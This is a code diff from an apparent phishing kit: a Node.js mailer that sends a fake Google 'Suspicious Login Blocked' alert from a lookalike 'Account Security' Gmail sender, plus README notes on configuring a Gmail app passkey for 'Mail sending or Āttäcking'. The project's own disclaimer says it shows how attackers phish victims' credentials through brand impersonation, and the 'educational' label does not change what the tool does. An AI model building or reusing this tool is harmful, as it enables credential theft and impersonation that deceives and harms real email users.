@@ -122,8 +122,8 @@ const htmlContent = `
 
 // 📤 Email config
 const mailOptions = {
-  from: "Account Security <teamg00gleofficial@gmail.com>", // fixed typo (00gl → 00gle)
-  to: "tanjimifaz@gmail.com",
+  from: "Account Security <YOUR_GMAIL@gmail.com>", // fixed typo (00gl → 00gle)
+  to: "USER@gmail.com",
   subject: "⚠️ Suspicious Login Blocked 🚫",
   html: htmlContent
 };
@@ -142,5 +142,5 @@ transporter.sendMail(mailOptions, (error, info) => {
 1. Gmail app passkey should be created from that Gmail account that will be used for Mail sending or Āttäcking. Simply, Created app passkey and that GmIl account address should be same or the script will not work. (Example - Gmail user is russia1969@gmail.com; so the app passkey will need to be created from that russia1969@gmail.com
 
 
-## > [!WARNING]
+## > !WARNING ⚠️
 This project is built for strictly educational learning purposes only ! It shows how a real world attacker or real advance hacker can phish victim's Credintials info with Advance Mastering Social Engineering tricks and Phsycologically hits 🎯 human mind with official authorized brand impersonating 📨 mail 📥
